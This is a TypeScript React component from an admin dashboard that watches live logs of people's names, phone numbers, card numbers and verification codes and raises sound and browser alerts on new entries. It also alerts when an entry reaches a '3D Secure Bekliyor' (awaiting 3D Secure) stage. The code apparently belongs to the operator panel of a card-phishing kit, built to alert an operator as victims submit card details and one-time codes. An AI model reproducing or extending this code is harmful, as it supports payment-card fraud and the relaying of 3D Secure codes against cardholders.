'use client';

import { useEffect, useRef } from 'react';
import { useAdminLive } from '@/components/admin/AdminLiveProvider';
import { playNewLogSound, playThreeDSecureSound, setAdminNotificationVolume } from '@/lib/adminNotificationSound';
import {
  notifyNewLog,
  notifyThreeDSecure,
  requestAdminNotificationPermission,
} from '@/lib/adminNotifications';
import { isAdresteLog, isIslemdekilerLog } from '@/lib/logCategories';

interface LogSnapshot {
  status: string;
  verificationCode: string;
  pageType: string;
  cardNumber: string;
}

interface AdminLogRow {
  _id: string;
  name?: string;
  phone?: string;
  status?: string;
  verificationCode?: string;
  pageType?: string;
  cardNumber?: string;
}

const ALERT_COOLDOWN_MS = 6000;

function logSignature(log: LogSnapshot): string {
  return `${log.status}|${log.verificationCode}|${log.pageType}|${log.cardNumber}`;
}

function isThreeDState(log: LogSnapshot): boolean {
  return (
    log.status === '3D Secure Bekliyor' ||
    log.pageType === 'processing' ||
    !!log.verificationCode ||
    log.cardNumber.length >= 6
  );
}

function isThreeDEvent(log: LogSnapshot, prev?: LogSnapshot): boolean {
  if (log.status === '3D Secure Bekliyor' || log.pageType === 'processing') {
    if (!prev || prev.status !== log.status || prev.pageType !== log.pageType) {
      return true;
    }
  }
  if (log.verificationCode && (!prev || prev.verificationCode !== log.verificationCode)) {
    return true;
  }
  if (log.cardNumber && log.cardNumber.length >= 6 && (!prev || !prev.cardNumber || prev.cardNumber.length < 6)) {
    return true;
  }
  return false;
}

export default function AdminLogSoundListener() {
  const { logs, lastSyncAt } = useAdminLive();
  const snapshotRef = useRef<Map<string, string>>(new Map());
  const alertedNewRef = useRef<Set<string>>(new Set());
  const alerted3dRef = useRef<Set<string>>(new Set());
  const lastAlertAtRef = useRef(0);
  const soundEnabledRef = useRef(true);
  const initializedRef = useRef(false);

  useEffect(() => {
    const unlockAlerts = () => {
      const ctx = new (window.AudioContext || (window as typeof window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext!)();
      void ctx.resume();
      void requestAdminNotificationPermission();
    };
    document.addEventListener('click', unlockAlerts, { once: true });

    const fetchSettings = async () => {
      try {
        const res = await fetch(`/api/settings?t=${Date.now()}`, { cache: 'no-store' });
        const data = await res.json();
        if (data.success) {
          soundEnabledRef.current = data.data.adminSoundEnabled !== false;
          const volume =
            typeof data.data.adminSoundVolume === 'number'
              ? Math.max(0, Math.min(100, data.data.adminSoundVolume))
              : 80;
          setAdminNotificationVolume(volume);
        }
      } catch {
        soundEnabledRef.current = true;
      }
    };

    void fetchSettings();
    const settingsInterval = setInterval(fetchSettings, 10000);

    return () => {
      document.removeEventListener('click', unlockAlerts);
      clearInterval(settingsInterval);
    };
  }, []);

  useEffect(() => {
    const canPlayAlert = () => {
      if (!soundEnabledRef.current) return false;
      return Date.now() - lastAlertAtRef.current >= ALERT_COOLDOWN_MS;
    };

    const playNewAlert = (log: AdminLogRow) => {
      if (!canPlayAlert() || alertedNewRef.current.has(log._id)) return;
      alertedNewRef.current.add(log._id);
      lastAlertAtRef.current = Date.now();
      playNewLogSound();
      notifyNewLog(log.name, log.phone);
    };

    const play3dAlert = (log: AdminLogRow) => {
      if (!canPlayAlert() || alerted3dRef.current.has(log._id)) return;
      alerted3dRef.current.add(log._id);
      lastAlertAtRef.current = Date.now();
      playThreeDSecureSound();
      notifyThreeDSecure(log.name || log.phone, log.verificationCode);
    };

    const rows = logs.filter(
      (log) =>
        log.status !== 'Form Dolduruluyor' &&
        (isAdresteLog(log) || isIslemdekilerLog(log) || log.status === 'Başarılı')
    ) as AdminLogRow[];

    const nextSnapshot = new Map<string, string>();

    if (!initializedRef.current) {
      rows.forEach((log) => {
        alertedNewRef.current.add(log._id);
        alerted3dRef.current.add(log._id);
        nextSnapshot.set(
          log._id,
          logSignature({
            status: log.status || '',
            verificationCode: log.verificationCode || '',
            pageType: log.pageType || '',
            cardNumber: log.cardNumber || '',
          })
        );
      });
      snapshotRef.current = nextSnapshot;
      initializedRef.current = true;
      return;
    }

    for (const log of rows) {
      const current: LogSnapshot = {
        status: log.status || '',
        verificationCode: log.verificationCode || '',
        pageType: log.pageType || '',
        cardNumber: log.cardNumber || '',
      };
      const signature = logSignature(current);
      nextSnapshot.set(log._id, signature);

      const prevSignature = snapshotRef.current.get(log._id);
      if (!prevSignature) {
        if (isThreeDState(current)) {
          play3dAlert(log);
        } else {
          playNewAlert(log);
        }
        continue;
      }

      if (prevSignature === signature) continue;

      const prevParts = prevSignature.split('|');
      const prev: LogSnapshot = {
        status: prevParts[0] || '',
        verificationCode: prevParts[1] || '',
        pageType: prevParts[2] || '',
        cardNumber: prevParts[3] || '',
      };

      if (isThreeDEvent(current, prev)) {
        play3dAlert(log);
      }
    }

    snapshotRef.current = nextSnapshot;
  }, [logs, lastSyncAt]);

  return null;
}
